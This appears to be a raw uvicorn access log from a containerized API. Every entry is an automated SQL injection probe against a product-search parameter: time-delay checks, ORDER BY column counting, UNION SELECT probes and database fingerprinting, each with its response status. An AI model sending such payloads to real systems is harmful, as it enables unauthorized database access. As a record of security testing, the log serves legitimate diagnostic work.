api-1  | INFO:     Started server process [1]
api-1  | INFO:     172.18.0.1:49398 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27--%2F%2A%2A%2FYDar HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:49406 - "GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F9996%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28108%29%7C%7CCHR%28119%29%7C%7CCHR%2877%29%7C%7CCHR%2869%29%2C5%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27koKM%27%3D%27koKM HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:49396 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F9996%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28108%29%7C%7CCHR%28119%29%7C%7CCHR%2877%29%7C%7CCHR%2869%29%2C5%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27aCnG%27%3D%27aCnG HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:49422 - "GET /produtos/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F9996%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28108%29%7C%7CCHR%28119%29%7C%7CCHR%2877%29%7C%7CCHR%2869%29%2C5%29%2F%2A%2A%2FAND%2F%2A%2A%2F%288388%3D8388 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:49434 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F9996%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28108%29%7C%7CCHR%28119%29%7C%7CCHR%2877%29%7C%7CCHR%2869%29%2C5%29 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:49450 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F9996%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28108%29%7C%7CCHR%28119%29%7C%7CCHR%2877%29%7C%7CCHR%2869%29%2C5%29--%2F%2A%2A%2FFgIn HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:49444 - "GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1--%2F%2A%2A%2FkSKK HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:49454 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1--%2F%2A%2A%2FkBKG HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:49462 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F7105--%2F%2A%2A%2FfAja HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:49484 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F10--%2F%2A%2A%2FXfwG HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:49476 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F6--%2F%2A%2A%2FlfnC HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:49492 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F4--%2F%2A%2A%2FQEfN HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:49506 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F5--%2F%2A%2A%2FgVcg HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:49518 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FUNION%2F%2A%2A%2FALL%2F%2A%2A%2FSELECT%2F%2A%2A%2FNULL%2CNULL%2CNULL%2CNULL%2CCONCAT%28CONCAT%28%27qqkzq%27%2C%27rUVZkSRSxzFyKcfGizcxzrWhCdQBYZrlWAAIrISo%27%29%2C%27qvppq%27%29--%2F%2A%2A%2FrfUg HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:49538 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FUNION%2F%2A%2A%2FALL%2F%2A%2A%2FSELECT%2F%2A%2A%2FNULL%2CNULL%2CNULL%2CNULL%2CCONCAT%28CONCAT%28%27qqkzq%27%2C%27rUVZkSRSxzFyKcfGizcxzrWhCdQBYZrlWAAIrISo%27%29%2C%27qvppq%27%29%2F%2A%2A%2FUNION%2F%2A%2A%2FALL%2F%2A%2A%2FSELECT%2F%2A%2A%2FNULL%2CNULL%2CNULL%2CNULL%2CCONCAT%28CONCAT%28%27qqkzq%27%2C%27TFaJFowwSyFyIgKCBPXVEoCGBfnuwXgqSGgiPRhN%27%29%2C%27qvppq%27%29--%2F%2A%2A%2FhIdU HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:49548 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FUNION%2F%2A%2A%2FALL%2F%2A%2A%2FSELECT%2F%2A%2A%2FNULL%2CNULL%2CNULL%2CNULL%2CCONCAT%28CONCAT%28%27qqkzq%27%2C%27rUVZkSRSxzFyKcfGizcxzrWhCdQBYZrlWAAIrISo%27%29%2C%27qvppq%27%29%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F0%2F%2A%2A%2FAS%2F%2A%2A%2FKsii%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F1%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F2%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F3%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F4%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F5%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F6%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F7%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F8%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F9%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F10%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F11%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F12%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F13%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F14%29%2F%2A%2A%2FAS%2F%2A%2A%2FhFnc--%2F%2A%2A%2FeMjo HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:49534 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FUNION%2F%2A%2A%2FALL%2F%2A%2A%2FSELECT%2F%2A%2A%2FNULL%2CNULL%2CNULL%2CNULL%2CCONCAT%28CONCAT%28%27qqkzq%27%2C%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%2834%3D34%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F%271%27%2F%2A%2A%2FELSE%2F%2A%2A%2F%270%27%2F%2A%2A%2FEND%29%29%2C%27qvppq%27%29--%2F%2A%2A%2FTCuI HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:49562 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FUNION%2F%2A%2A%2FALL%2F%2A%2A%2FSELECT%2F%2A%2A%2FNULL%2CNULL%2CNULL%2CNULL%2CCONCAT%28CONCAT%28%27qqkzq%27%2C%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%2834%3D38%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F%271%27%2F%2A%2A%2FELSE%2F%2A%2A%2F%270%27%2F%2A%2A%2FEND%29%29%2C%27qvppq%27%29--%2F%2A%2A%2FqbcL HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:49574 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FUNION%2F%2A%2A%2FALL%2F%2A%2A%2FSELECT%2F%2A%2A%2FNULL%2CNULL%2CNULL%2CNULL%2CCONCAT%28CONCAT%28%27qqkzq%27%2C%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%2834%3D76%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F%271%27%2F%2A%2A%2FELSE%2F%2A%2A%2F%270%27%2F%2A%2A%2FEND%29%29%2C%27qvppq%27%29--%2F%2A%2A%2FhCJk HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:49590 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FUNION%2F%2A%2A%2FALL%2F%2A%2A%2FSELECT%2F%2A%2A%2FNULL%2CNULL%2CNULL%2CNULL%2CCONCAT%28CONCAT%28%27qqkzq%27%2C%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%2876%3D38%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F%271%27%2F%2A%2A%2FELSE%2F%2A%2A%2F%270%27%2F%2A%2A%2FEND%29%29%2C%27qvppq%27%29--%2F%2A%2A%2FVGfC HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:49598 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FUNION%2F%2A%2A%2FALL%2F%2A%2A%2FSELECT%2F%2A%2A%2FNULL%2CNULL%2CNULL%2CNULL%2CCONCAT%28CONCAT%28%27qqkzq%27%2C%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%2838%3D38%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F%271%27%2F%2A%2A%2FELSE%2F%2A%2A%2F%270%27%2F%2A%2A%2FEND%29%29%2C%27qvppq%27%29--%2F%2A%2A%2FOKKK HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:49606 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FUNION%2F%2A%2A%2FALL%2F%2A%2A%2FSELECT%2F%2A%2A%2FNULL%2CNULL%2CNULL%2CNULL%2CCONCAT%28CONCAT%28%27qqkzq%27%2C%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%2876%2F%2A%2A%2F38%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F%271%27%2F%2A%2A%2FELSE%2F%2A%2A%2F%270%27%2F%2A%2A%2FEND%29%29%2C%27qvppq%27%29--%2F%2A%2A%2FmHHO HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:49600 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FUNION%2F%2A%2A%2FALL%2F%2A%2A%2FSELECT%2F%2A%2A%2FNULL%2CNULL%2CNULL%2CNULL%2CCONCAT%28CONCAT%28%27qqkzq%27%2C%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%283231%3D%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F%2F%2A%2A%2F3231%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F%271%27%2F%2A%2A%2FELSE%2F%2A%2A%2F%270%27%2F%2A%2A%2FEND%29%29%2C%27qvppq%27%29--%2F%2A%2A%2FEwCJ HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:49612 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FUNION%2F%2A%2A%2FALL%2F%2A%2A%2FSELECT%2F%2A%2A%2FNULL%2CNULL%2CNULL%2CNULL%2CCONCAT%280x71716b7a71%2C%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%28IFNULL%28QUARTER%28NULL%29%2CNULL%2F%2A%2A%2FXOR%2F%2A%2A%2FNULL%29%2F%2A%2A%2FIS%2F%2A%2A%2FNULL%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2C0x7176707071%29--%2F%2A%2A%2F- HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:49618 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FUNION%2F%2A%2A%2FALL%2F%2A%2A%2FSELECT%2F%2A%2A%2FNULL%2CNULL%2CNULL%2CNULL%2CCONCAT%280x71716b7a71%2C%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%28IFNULL%28QUARTER%28NULL%29%2CNULL%2F%2A%2A%2FXOR%2F%2A%2A%2FNULL%29%2F%2A%2A%2FIS%2F%2A%2A%2FNULL%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2C0x7176707071%29--%2F%2A%2A%2F- HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:49632 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FUNION%2F%2A%2A%2FALL%2F%2A%2A%2FSELECT%2F%2A%2A%2FNULL%2CNULL%2CNULL%2CNULL%2CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%28LENGTH%28SYSDATE%29%3DLENGTH%28SYSDATE%29%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL--%2F%2A%2A%2FZjQe HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:49638 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FUNION%2F%2A%2A%2FALL%2F%2A%2A%2FSELECT%2F%2A%2A%2FNULL%2CNULL%2CNULL%2CNULL%2C%28CHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%28CONVERT_TO%28%27Rcbh%27%2CQUOTE_IDENT%28NULL%29%29%2F%2A%2A%2FIS%2F%2A%2A%2FNULL%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F%28CHR%2849%29%29%2F%2A%2A%2FELSE%2F%2A%2A%2F%28CHR%2848%29%29%2F%2A%2A%2FEND%29%29%7C%7C%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29--%2F%2A%2A%2FNvCB HTTP/1.1" 500 Internal Server Error
